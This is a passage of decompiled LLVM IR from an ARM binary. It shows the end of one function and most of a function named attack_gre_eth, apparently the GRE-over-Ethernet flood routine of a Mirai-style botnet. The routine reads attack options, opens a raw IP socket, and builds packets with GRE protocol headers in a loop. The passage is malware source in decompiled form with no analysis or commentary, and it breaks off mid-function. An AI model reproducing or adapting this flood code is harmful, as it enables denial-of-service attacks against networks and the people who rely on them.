  %v2_a56c = add i32 %v1_a56c, %v3_a55c
  store i32 %v2_a56c, i32* %r1.global-to-local, align 4
  %v2_a570 = load i32, i32* @global_var_24644.67, align 4
  %v2_a574 = inttoptr i32 %v2_a558 to i32*
  store i32 ptrtoint (i32* @global_var_ad34.85 to i32), i32* %v2_a574, align 4
  %v3_a578 = load i32, i32* @r4, align 4
  %v4_a578 = add i32 %v3_a578, 4
  %v5_a578 = inttoptr i32 %v4_a578 to i8*
  store i8 6, i8* %v5_a578, align 1
  %v0_a57c = load i32, i32* %r1.global-to-local, align 4
  %v3_a57c = mul i32 %v0_a57c, 4
  store i32 %v3_a57c, i32* %r1.global-to-local, align 4
  %v5_a580 = inttoptr i32 %v2_a570 to i32*
  %v6_a580 = call i32 @realloc(i32* %v5_a580, i32 %v3_a57c, i32 ptrtoint (i32* @global_var_ad34.85 to i32), i32 6)
  %v2_a584 = load i8, i8* bitcast (i8** @global_var_24640.65 to i8*), align 4
  %v3_a584 = zext i8 %v2_a584 to i32
  store i32 %v3_a584, i32* %r3.global-to-local, align 4
  store i32 %v6_a580, i32* %r2.global-to-local, align 4
  %v0_a58c = load i32, i32* @r4, align 4
  %v5_a58c = mul nuw nsw i32 %v3_a584, 4
  %v6_a58c = add i32 %v5_a58c, %v6_a580
  %v7_a58c = inttoptr i32 %v6_a58c to i32*
  store i32 %v0_a58c, i32* %v7_a58c, align 4
  %v0_a590 = load i32, i32* @r7, align 4
  store i32 %v0_a590, i32* %r1.global-to-local, align 4
  %v0_a594 = load i32, i32* %r3.global-to-local, align 4
  %v1_a594 = load i32, i32* @r8, align 4
  %v2_a594 = add i32 %v1_a594, %v0_a594
  store i32 %v2_a594, i32* %r3.global-to-local, align 4
  %v1_a59c = trunc i32 %v2_a594 to i8
  %v2_a59c = load i32, i32* @r5, align 4
  %v3_a59c = inttoptr i32 %v2_a59c to i8*
  store i8 %v1_a59c, i8* %v3_a59c, align 1
  %v0_a5a0 = load i32, i32* %r2.global-to-local, align 4
  %v1_a5a0 = load i32, i32* @r6, align 4
  %v2_a5a0 = inttoptr i32 %v1_a5a0 to i32*
  store i32 %v0_a5a0, i32* %v2_a5a0, align 4
  %v2_a5a4 = call i32 @calloc(i32 %v1_a594, i32 %v0_a590)
  %v2_a5a8 = load i8, i8* bitcast (i8** @global_var_24640.65 to i8*), align 4
  %v3_a5a8 = zext i8 %v2_a5a8 to i32
  store i32 ptrtoint (i32* @global_var_a66c.87 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a5a4, i32* @r4, align 4
  store i32 7, i32* %r3.global-to-local, align 4
  %v1_a5b8 = load i32, i32* @r8, align 4
  %v2_a5b8 = add i32 %v1_a5b8, %v3_a5a8
  store i32 %v2_a5b8, i32* %r1.global-to-local, align 4
  %v2_a5bc = load i32, i32* @global_var_24644.67, align 4
  %v2_a5c0 = inttoptr i32 %v2_a5a4 to i32*
  store i32 ptrtoint (i32* @global_var_a66c.87 to i32), i32* %v2_a5c0, align 4
  %v3_a5c4 = load i32, i32* @r4, align 4
  %v4_a5c4 = add i32 %v3_a5c4, 4
  %v5_a5c4 = inttoptr i32 %v4_a5c4 to i8*
  store i8 7, i8* %v5_a5c4, align 1
  %v0_a5c8 = load i32, i32* %r1.global-to-local, align 4
  %v3_a5c8 = mul i32 %v0_a5c8, 4
  store i32 %v3_a5c8, i32* %r1.global-to-local, align 4
  %v5_a5cc = inttoptr i32 %v2_a5bc to i32*
  %v6_a5cc = call i32 @realloc(i32* %v5_a5cc, i32 %v3_a5c8, i32 ptrtoint (i32* @global_var_a66c.87 to i32), i32 7)
  %v2_a5d0 = load i8, i8* bitcast (i8** @global_var_24640.65 to i8*), align 4
  %v3_a5d0 = zext i8 %v2_a5d0 to i32
  store i32 %v3_a5d0, i32* %r3.global-to-local, align 4
  store i32 %v6_a5cc, i32* %r2.global-to-local, align 4
  %v0_a5d8 = load i32, i32* @r4, align 4
  %v5_a5d8 = mul nuw nsw i32 %v3_a5d0, 4
  %v6_a5d8 = add i32 %v5_a5d8, %v6_a5cc
  %v7_a5d8 = inttoptr i32 %v6_a5d8 to i32*
  store i32 %v0_a5d8, i32* %v7_a5d8, align 4
  %v0_a5dc = load i32, i32* @r7, align 4
  store i32 %v0_a5dc, i32* %r1.global-to-local, align 4
  %v0_a5e0 = load i32, i32* %r3.global-to-local, align 4
  %v1_a5e0 = load i32, i32* @r8, align 4
  %v2_a5e0 = add i32 %v1_a5e0, %v0_a5e0
  store i32 %v2_a5e0, i32* %r3.global-to-local, align 4
  %v1_a5e8 = trunc i32 %v2_a5e0 to i8
  %v2_a5e8 = load i32, i32* @r5, align 4
  %v3_a5e8 = inttoptr i32 %v2_a5e8 to i8*
  store i8 %v1_a5e8, i8* %v3_a5e8, align 1
  %v0_a5ec = load i32, i32* %r2.global-to-local, align 4
  %v1_a5ec = load i32, i32* @r6, align 4
  %v2_a5ec = inttoptr i32 %v1_a5ec to i32*
  store i32 %v0_a5ec, i32* %v2_a5ec, align 4
  %v2_a5f0 = call i32 @calloc(i32 %v1_a5e0, i32 %v0_a5dc)
  %v2_a5f4 = load i8, i8* bitcast (i8** @global_var_24640.65 to i8*), align 4
  %v3_a5f4 = zext i8 %v2_a5f4 to i32
  store i32 ptrtoint (i32* @global_var_81d0.89 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a5f0, i32* @r4, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v1_a604 = load i32, i32* @r8, align 4
  %v2_a604 = add i32 %v1_a604, %v3_a5f4
  store i32 %v2_a604, i32* %r1.global-to-local, align 4
  %v2_a608 = load i32, i32* @global_var_24644.67, align 4
  %v2_a60c = inttoptr i32 %v2_a5f0 to i32*
  store i32 ptrtoint (i32* @global_var_81d0.89 to i32), i32* %v2_a60c, align 4
  %v3_a610 = load i32, i32* @r4, align 4
  %v4_a610 = add i32 %v3_a610, 4
  %v5_a610 = inttoptr i32 %v4_a610 to i8*
  store i8 9, i8* %v5_a610, align 1
  %v0_a614 = load i32, i32* %r1.global-to-local, align 4
  %v3_a614 = mul i32 %v0_a614, 4
  store i32 %v3_a614, i32* %r1.global-to-local, align 4
  %v5_a618 = inttoptr i32 %v2_a608 to i32*
  %v6_a618 = call i32 @realloc(i32* %v5_a618, i32 %v3_a614, i32 ptrtoint (i32* @global_var_81d0.89 to i32), i32 9)
  %v2_a61c = load i8, i8* bitcast (i8** @global_var_24640.65 to i8*), align 4
  %v3_a61c = zext i8 %v2_a61c to i32
  store i32 %v3_a61c, i32* %r3.global-to-local, align 4
  %v1_a620 = load i32, i32* @r6, align 4
  %v2_a620 = inttoptr i32 %v1_a620 to i32*
  store i32 %v6_a618, i32* %v2_a620, align 4
  %v0_a624 = load i32, i32* @r4, align 4
  %v2_a624 = load i32, i32* %r3.global-to-local, align 4
  %v5_a624 = mul i32 %v2_a624, 4
  %v6_a624 = add i32 %v5_a624, %v6_a618
  %v7_a624 = inttoptr i32 %v6_a624 to i32*
  store i32 %v0_a624, i32* %v7_a624, align 4
  %v0_a628 = load i32, i32* %r3.global-to-local, align 4
  %v1_a628 = load i32, i32* @r8, align 4
  %v2_a628 = add i32 %v1_a628, %v0_a628
  store i32 %v2_a628, i32* %r2.global-to-local, align 4
  %v1_a630 = trunc i32 %v2_a628 to i8
  %v2_a630 = load i32, i32* @r5, align 4
  %v3_a630 = inttoptr i32 %v2_a630 to i8*
  store i8 %v1_a630, i8* %v3_a630, align 1
  %v2_a634 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_a634, i32* @r4, align 4
  store i32 %v6_a330, i32* @r5, align 4
  store i32 %v9_a330, i32* @r6, align 4
  store i32 %v12_a330, i32* @r7, align 4
  store i32 %v15_a330, i32* @r8, align 4
  ret i32 %v1_a628

; uselistorder directives
  uselistorder i32 %v1_a628, { 1, 0 }
  uselistorder i32 %v3_a614, { 1, 0 }
  uselistorder i32 %v1_a5e0, { 1, 0 }
  uselistorder i32 %v3_a5c8, { 1, 0 }
  uselistorder i32 %v1_a594, { 1, 0 }
  uselistorder i32 %v3_a57c, { 1, 0 }
  uselistorder i32 %v1_a548, { 1, 0 }
  uselistorder i32 %v3_a530, { 1, 0 }
  uselistorder i32 %v1_a4fc, { 1, 0 }
  uselistorder i32 %v3_a4e4, { 1, 0 }
  uselistorder i32 %v1_a4b0, { 1, 0 }
  uselistorder i32 %v3_a498, { 1, 0 }
  uselistorder i32 %v1_a464, { 1, 0 }
  uselistorder i32 %v3_a44c, { 1, 0 }
  uselistorder i32 %v1_a418, { 1, 0 }
  uselistorder i32 %v6_a404, { 1, 2, 0, 3 }
  uselistorder i32 %v3_a400, { 1, 0 }
  uselistorder i32 %v1_a3cc, { 1, 0 }
  uselistorder i32 %v3_a3b4, { 1, 0 }
  uselistorder i32 %v2_a390, { 1, 0 }
  uselistorder i32 %v6_a36c, { 1, 2, 0, 3 }
  uselistorder i32 %v3_a368, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 27, 28, 29, 30, 31, 32, 25, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 19, 20, 17, 21, 22, 23, 24 }
  uselistorder i8 7, { 2, 3, 4, 0, 1 }
  uselistorder i8 4, { 2, 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_24640.65 to i8*), { 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_24641.71 to i32), { 2, 1, 0 }
  uselistorder i8** @global_var_24640.65, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_24640.65 to i32), { 1, 0 }
}

define i32 @attack_gre_eth(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-54 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_a66c = load i32, i32* @r4, align 4
  %v24_a66c = load i32, i32* @fp, align 4
  %v27_a66c = load i32, i32* @lr, align 4
  store i32 0, i32* @sb, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg5, i32* @r4, align 4
  store i32 %arg3, i32* @sl, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_a698 = call i32 @calloc(i32 %arg2, i32 4)
  %v0_a69c = load i32, i32* @r4, align 4
  store i32 %v0_a69c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_a6a8 = load i32, i32* @sb, align 4
  store i32 %v0_a6a8, i32* %r3.global-to-local, align 4
  %v0_a6ac = load i32, i32* @r5, align 4
  store i32 %v0_a6ac, i32* %r0.global-to-local, align 4
  %v5_a6b0 = inttoptr i32 %v0_a69c to i32*
  %v6_a6b0 = call i32 @attack_get_opt_int(i32 %v0_a6ac, i32* %v5_a6b0, i32 2, i32 %v0_a6a8)
  %v1_a6bc = urem i32 %v6_a6b0, 256
  store i32 %v1_a6bc, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_a6c8 = load i32, i32* @r4, align 4
  store i32 %v0_a6c8, i32* %r1.global-to-local, align 4
  %v0_a6cc = load i32, i32* @r5, align 4
  store i32 %v0_a6cc, i32* %r0.global-to-local, align 4
  %v5_a6d0 = trunc i32 %v6_a6b0 to i8
  %v6_a6d4 = inttoptr i32 %v0_a6c8 to i32*
  %v7_a6d4 = call i32 @attack_get_opt_int(i32 %v0_a6cc, i32* %v6_a6d4, i32 3, i32 65535)
  %v0_a6d8 = load i32, i32* @r4, align 4
  store i32 %v0_a6d8, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_a6d4, i32* %fp.global-to-local, align 4
  %v0_a6e8 = load i32, i32* @r5, align 4
  store i32 %v0_a6e8, i32* %r0.global-to-local, align 4
  %v4_a6ec = inttoptr i32 %v0_a6d8 to i32*
  %v5_a6ec = call i32 @attack_get_opt_int(i32 %v0_a6e8, i32* %v4_a6ec, i32 4, i32 64)
  %v1_a6f4 = urem i32 %v5_a6ec, 256
  store i32 %v1_a6f4, i32* %ip.global-to-local, align 4
  %v0_a6f8 = load i32, i32* @r4, align 4
  store i32 %v0_a6f8, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a704 = load i32, i32* @r5, align 4
  store i32 %v0_a704, i32* %r0.global-to-local, align 4
  %v6_a70c = inttoptr i32 %v0_a6f8 to i32*
  %v7_a70c = call i32 @attack_get_opt_int(i32 %v0_a704, i32* %v6_a70c, i32 5, i32 1)
  %v1_a718 = urem i32 %v7_a70c, 256
  store i32 %v1_a718, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_a724 = load i32, i32* @r4, align 4
  store i32 %v0_a724, i32* %r1.global-to-local, align 4
  %v0_a728 = load i32, i32* @r5, align 4
  store i32 %v0_a728, i32* %r0.global-to-local, align 4
  %v5_a730 = inttoptr i32 %v0_a724 to i32*
  %v6_a730 = call i32 @attack_get_opt_int(i32 %v0_a728, i32* %v5_a730, i32 6, i32 65535)
  %v0_a73c = load i32, i32* @r4, align 4
  store i32 %v0_a73c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_a748 = load i32, i32* @r5, align 4
  store i32 %v0_a748, i32* %r0.global-to-local, align 4
  %v5_a74c = inttoptr i32 %v0_a73c to i32*
  %v6_a74c = call i32 @attack_get_opt_int(i32 %v0_a748, i32* %v5_a74c, i32 7, i32 65535)
  %v0_a750 = load i32, i32* @r4, align 4
  store i32 %v0_a750, i32* %r1.global-to-local, align 4
  %v0_a754 = load i32, i32* @sb, align 4
  store i32 %v0_a754, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v6_a74c, i32* @r8, align 4
  %v0_a760 = load i32, i32* @r5, align 4
  store i32 %v0_a760, i32* %r0.global-to-local, align 4
  %v4_a764 = inttoptr i32 %v0_a750 to i32*
  %v5_a764 = call i32 @attack_get_opt_int(i32 %v0_a760, i32* %v4_a764, i32 %v0_a754, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a774 = load i32, i32* @r4, align 4
  store i32 %v0_a774, i32* %r1.global-to-local, align 4
  %v0_a778 = load i32, i32* @r5, align 4
  store i32 %v0_a778, i32* %r0.global-to-local, align 4
  %v4_a77c = inttoptr i32 %v0_a774 to i32*
  %v5_a77c = call i32 @attack_get_opt_int(i32 %v0_a778, i32* %v4_a77c, i32 1, i32 1)
  %v1_a784 = urem i32 %v5_a77c, 256
  store i32 %v1_a784, i32* %ip.global-to-local, align 4
  %v0_a788 = load i32, i32* @r4, align 4
  store i32 %v0_a788, i32* %r1.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  %v0_a790 = load i32, i32* @sb, align 4
  store i32 %v0_a790, i32* %r3.global-to-local, align 4
  %v0_a794 = load i32, i32* @r5, align 4
  store i32 %v0_a794, i32* %r0.global-to-local, align 4
  %v5_a79c = inttoptr i32 %v0_a788 to i32*
  %v6_a79c = call i32 @attack_get_opt_int(i32 %v0_a794, i32* %v5_a79c, i32 18, i32 %v0_a790)
  %v0_a7a4 = load i32, i32* @r4, align 4
  store i32 %v0_a7a4, i32* %r1.global-to-local, align 4
  %v2_a7a8 = load i32, i32* @global_var_27164.91, align 4
  store i32 %v2_a7a8, i32* %r3.global-to-local, align 4
  store i32 %v6_a79c, i32* @r7, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  %v0_a7b4 = load i32, i32* @r5, align 4
  store i32 %v0_a7b4, i32* %r0.global-to-local, align 4
  %v4_a7b8 = inttoptr i32 %v0_a7a4 to i32*
  %v5_a7b8 = call i32 @attack_get_opt_int(i32 %v0_a7b4, i32* %v4_a7b8, i32 24, i32 %v2_a7a8)
  %v0_a7c0 = load i32, i32* @sb, align 4
  store i32 %v0_a7c0, i32* %r0.global-to-local, align 4
  %v1_a7c4 = inttoptr i32 %v0_a7c0 to i32*
  %v2_a7c4 = call i32 @__GI_time(i32* %v1_a7c4)
  %v1_a7c8 = load i32, i32* @r6, align 4
  %v2_a7c8 = add i32 %v1_a7c8, %v2_a7c4
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_a7dc = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_a7dc, i32* %r0.global-to-local, align 4
  %v7_a7e0 = icmp eq i32 %v3_a7dc, -1
  store i1 %v7_a7e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a7e0, label %dec_label_pc_ad18, label %dec_label_pc_a7ec

dec_label_pc_a7ec:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_a7f4 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_a7f4, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_a7fc = load i32, i32* @sb, align 4
  store i32 %v0_a7fc, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_a808 = call i32 @__GI_setsockopt(i32 %v3_a7dc, i32 %v0_a7fc, i32 3, i32 %v6_a7f4, i32 4)
  store i32 %v5_a808, i32* %r0.global-to-local, align 4
  %v7_a80c = icmp eq i32 %v5_a808, -1
  store i1 %v7_a80c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a80c, label %dec_label_pc_ad24, label %dec_label_pc_a814

dec_label_pc_a814:                                ; preds = %dec_label_pc_a7ec
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v3_a81c = mul i32 %v6_a730, 65536
  store i32 %v3_a81c, i32* %r1.global-to-local, align 4
  %v0_a820 = load i32, i32* @r8, align 4
  %v0_a824 = load i32, i32* %fp.global-to-local, align 4
  %v3_a824 = mul i32 %v0_a824, 65536
  store i32 %v3_a824, i32* %fp.global-to-local, align 4
  %v0_a828 = load i32, i32* @r7, align 4
  %v1_a828 = urem i32 %v0_a828, 256
  store i32 %v1_a828, i32* @r7, align 4
  %v3_a82c = urem i32 %v0_a824, 65536
  store i32 %v3_a82c, i32* %r3.global-to-local, align 4
  %v3_a830 = urem i32 %v6_a730, 65536
  store i32 %v3_a830, i32* %ip.global-to-local, align 4
  %v3_a834 = urem i32 %v0_a820, 65536
  %v2_a838 = icmp eq i32 %arg2, 0
  store i1 %v2_a838, i1* %cpsr_z.global-to-local, align 1
  %v0_a848 = load i32, i32* @sb, align 4
  store i32 %v0_a848, i32* %stack_var_-44, align 4
  br i1 %v2_a838, label %dec_label_pc_aa50.preheader, label %dec_label_pc_a85c

dec_label_pc_a85c:                                ; preds = %dec_label_pc_a814
  %v3_a820 = mul i32 %v0_a820, 65536
  %v3_a860 = mul i32 %v5_a764, 65536
  %v1_a864 = add i32 %v3_a860, 4325376
  %v0_a824.not = or i32 %v0_a824, -65536
  %v1_a868 = xor i32 %v0_a824.not, 65535
  %v3_a874 = mul i32 %v1_a868, 65536
  store i32 %v3_a874, i32* @r6, align 4
  %tmp68 = udiv i32 %v1_a864, 256
  %v3_a88c = and i32 %tmp68, 65280
  store i32 %v3_a88c, i32* %r3.global-to-local, align 4
  %v1_a890 = add i32 %v3_a860, 524288
  %tmp69 = mul i32 %v0_a824, 256
  %v3_a894 = and i32 %tmp69, 65280
  %v1_a898 = add i32 %v3_a860, 1835008
  %tmp70 = mul nsw i32 %v1_a868, 256
  %v3_a89c = and i32 %tmp70, 65280
  %v4_a8a0 = udiv i32 %v1_a864, 16777216
  %v5_a8a0 = or i32 %v4_a8a0, %tmp68
  %v3_a8a8 = udiv i32 %v1_a898, 256
  %v5_a8ac = trunc i32 %v5_a8a0 to i16
  %tmp71 = udiv i32 %v0_a824, 256
  %v4_a8b0 = urem i32 %tmp71, 256
  %v5_a8b0 = or i32 %v4_a8b0, %v3_a894
  store i32 %v5_a8b0, i32* @r7, align 4
  %tmp72 = udiv i32 %v1_a868, 256
  %v4_a8b4 = urem i32 %tmp72, 256
  %v5_a8b4 = or i32 %v4_a8b4, %v3_a89c
  store i32 %v5_a8b4, i32* @fp, align 4
  store i32 %v3_a820, i32* %r2.global-to-local, align 4
  store i32 %v3_a81c, i32* %r1.global-to-local, align 4
  %v1_a8c0 = and i32 %v3_a8a8, 65280
  %tmp73 = mul i32 %v6_a730, 256
  %v3_a8c4 = and i32 %tmp73, 65280
  %tmp74 = mul i32 %v0_a820, 256
  %v3_a8c8 = and i32 %tmp74, 65280
  %v4_a8d0 = udiv i32 %v1_a898, 16777216
  %v5_a8d0 = or i32 %v1_a8c0, %v4_a8d0
  store i32 %v5_a8d0, i32* @r5, align 4
  %tmp75 = udiv i32 %v6_a730, 256
  %v4_a8d4 = urem i32 %tmp75, 256
  %v5_a8d4 = or i32 %v4_a8d4, %v3_a8c4
  store i32 %v5_a8d4, i32* %r0.global-to-local, align 4
  %tmp76 = udiv i32 %v0_a820, 256
  %v4_a8d8 = urem i32 %tmp76, 256
  %v5_a8d8 = or i32 %v4_a8d8, %v3_a8c8
  store i32 %v5_a8d8, i32* %ip.global-to-local, align 4
  %tmp77 = udiv i32 %v1_a890, 256
  %v3_a8dc = and i32 %tmp77, 65280
  store i32 %v3_a8dc, i32* @lr, align 4
  %v5_a8e8 = trunc i32 %v5_a8d0 to i16
  %v4_a8ec = udiv i32 %v1_a890, 16777216
  %v5_a8ec = or i32 %v3_a8dc, %v4_a8ec
  store i32 %v5_a8ec, i32* @r8, align 4
  store i32 %v0_a848, i32* @r4, align 4
  %v4_a948 = sext i8 %v5_a6d0 to i32
  %v1_a954 = trunc i32 %v5_a6ec to i8
  %v2_aa08 = icmp eq i32 %v1_a828, 0
  %sext = mul nuw i32 %v5_a8d4, 65536
  %v4_aa2c = sdiv i32 %sext, 65536
  %sext7 = mul nuw i32 %v5_a8d8, 65536
  %v4_aa34 = sdiv i32 %sext7, 65536
  br label %dec_label_pc_a8f4

dec_label_pc_a8f4:                                ; preds = %bb80, %dec_label_pc_a85c
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_a900 = call i32 @calloc(i32 1510, i32 4)
  store i32 %v2_a900, i32* %r0.global-to-local, align 4
  %v3_a908 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a908, i32* %r2.global-to-local, align 4
  %v2_a90c = load i32, i32* @r4, align 4
  %v5_a90c = mul i32 %v2_a90c, 4
  %v6_a90c = add i32 %v5_a90c, %v2_a698
  %v7_a90c = inttoptr i32 %v6_a90c to i32*
  store i32 %v2_a900, i32* %v7_a90c, align 4
  store i32 %v2_a698, i32* %r1.global-to-local, align 4
  %v0_a914 = load i32, i32* %r2.global-to-local, align 4
  %v3_a914 = mul i32 %v0_a914, 32
  store i32 %v3_a914, i32* %r3.global-to-local, align 4
  %v4_a918 = mul i32 %v0_a914, 4
  %v5_a918 = add i32 %v4_a918, %v2_a698
  %v6_a918 = inttoptr i32 %v5_a918 to i32*
  %v7_a918 = load i32, i32* %v6_a918, align 4
  store i32 %v7_a918, i32* %r4.global-to-local, align 4
  %v5_a91c = mul i32 %v0_a914, 24
  store i32 %v5_a91c, i32* %r3.global-to-local, align 4
  %v1_a920 = load i32, i32* @sl, align 4
  %v2_a920 = add i32 %v1_a920, %v5_a91c
  store i32 %v2_a920, i32* %lr.global-to-local, align 4
  %v1_a924 = inttoptr i32 %v7_a918 to i8*
  %v2_a924 = load i8, i8* %v1_a924, align 1
  %tmp = urem i8 %v2_a924, 16
  %v1_a928 = zext i8 %tmp to i32
  %v1_a92c = or i32 %v1_a928, 64
  store i32 %v1_a92c, i32* %r3.global-to-local, align 4
  %v1_a930 = trunc i32 %v1_a92c to i8
  store i8 %v1_a930, i8* %v1_a924, align 1
  %v0_a934 = load i32, i32* %r4.global-to-local, align 4
  %v1_a934 = inttoptr i32 %v0_a934 to i8*
  %v2_a934 = load i8, i8* %v1_a934, align 1
  %v1_a938 = and i8 %v2_a934, -16
  %v1_a93c = or i8 %v1_a938, 5
  store i32 %v1_a718, i32* %r3.global-to-local, align 4
  store i8 %v1_a93c, i8* %v1_a934, align 1
  store i32 %v4_a948, i32* %r1.global-to-local, align 4
  %v2_a94c = load i32, i32* %r4.global-to-local, align 4
  %v3_a94c = add i32 %v2_a94c, 1
  %v4_a94c = inttoptr i32 %v3_a94c to i8*
  store i8 %v5_a6d0, i8* %v4_a94c, align 1
  store i32 %v1_a6f4, i32* %r2.global-to-local, align 4
  %v2_a954 = load i32, i32* %r4.global-to-local, align 4
  %v3_a954 = add i32 %v2_a954, 8
  %v4_a954 = inttoptr i32 %v3_a954 to i8*
  store i8 %v1_a954, i8* %v4_a954, align 1
  %v0_a958 = load i32, i32* %r3.global-to-local, align 4
  %v2_a958 = icmp eq i32 %v0_a958, 0
  store i1 %v2_a958, i1* %cpsr_z.global-to-local, align 1
  %v2_a960 = load i32, i32* %r4.global-to-local, align 4
  %v3_a960 = add i32 %v2_a960, 2
  %v4_a960 = inttoptr i32 %v3_a960 to i16*
  store i16 %v5_a8ac, i16* %v4_a960, align 2
  %v2_a968 = load i32, i32* %r4.global-to-local, align 4
  %v3_a968 = add i32 %v2_a968, 9
  %v4_a968 = inttoptr i32 %v3_a968 to i8*
  store i8 47, i8* %v4_a968, align 1
  store i32 %v5_a7b8, i32* %r3.global-to-local, align 4
  %v1_a970 = load i32, i32* %r4.global-to-local, align 4
  %v2_a970 = add i32 %v1_a970, 12
  %v3_a970 = inttoptr i32 %v2_a970 to i32*
  store i32 %v5_a7b8, i32* %v3_a970, align 4
  %v0_a974 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a974, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_a8f4
  store i32 64, i32* %r2.global-to-local, align 4
  %v3_a978 = load i32, i32* %r4.global-to-local, align 4
  %v4_a978 = add i32 %v3_a978, 6
  %v5_a978 = inttoptr i32 %v4_a978 to i16*
  store i16 64, i16* %v5_a978, align 2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_a8f4, %bb
  %v0_a97c = load i32, i32* %lr.global-to-local, align 4
  %v1_a97c = add i32 %v0_a97c, 16
  %v2_a97c = inttoptr i32 %v1_a97c to i32*
  %v3_a97c = load i32, i32* %v2_a97c, align 4
  store i32 22528, i32* %ip.global-to-local, align 4
  %v1_a984 = load i32, i32* %r4.global-to-local, align 4
  %v2_a984 = add i32 %v1_a984, 16
  %v3_a984 = inttoptr i32 %v2_a984 to i32*
  store i32 %v3_a97c, i32* %v3_a984, align 4
  %v0_a988 = load i32, i32* %r4.global-to-local, align 4
  %v1_a988 = add i32 %v0_a988, 24
  store i32 %v1_a988, i32* %r0.global-to-local, align 4
  %v1_a98c = add i32 %v0_a988, 20
  store i32 %v1_a98c, i32* %r1.global-to-local, align 4
  %v0_a990 = load i32, i32* %ip.global-to-local, align 4
  %v1_a990 = add i32 %v0_a990, 101
  store i32 %v1_a990, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v0_a99c = load i32, i32* @r7, align 4
  %v1_a99c = trunc i32 %v0_a99c to i16
  %v3_a99c = add i32 %v0_a988, 4
  %v4_a99c = inttoptr i32 %v3_a99c to i16*
  store i16 %v1_a99c, i16* %v4_a99c, align 2
  %v0_a9a0 = load i32, i32* %ip.global-to-local, align 4
  %v1_a9a0 = trunc i32 %v0_a9a0 to i16
  %v2_a9a0 = load i32, i32* %r1.global-to-local, align 4
  %v3_a9a0 = add i32 %v2_a9a0, 2
  %v4_a9a0 = inttoptr i32 %v3_a9a0 to i16*
  store i16 %v1_a9a0, i16* %v4_a9a0, align 2
  %v0_a9a4 = load i32, i32* %r3.global-to-local, align 4
  %v1_a9a4 = trunc i32 %v0_a9a4 to i8
  %v2_a9a4 = load i32, i32* %r0.global-to-local, align 4
  %v3_a9a4 = add i32 %v2_a9a4, 13
  %v4_a9a4 = inttoptr i32 %v3_a9a4 to i8*
  store i8 %v1_a9a4, i8* %v4_a9a4, align 1
  %v0_a9a8 = load i32, i32* %r2.global-to-local, align 4
  %v1_a9a8 = trunc i32 %v0_a9a8 to i8
  %v2_a9a8 = load i32, i32* %r0.global-to-local, align 4
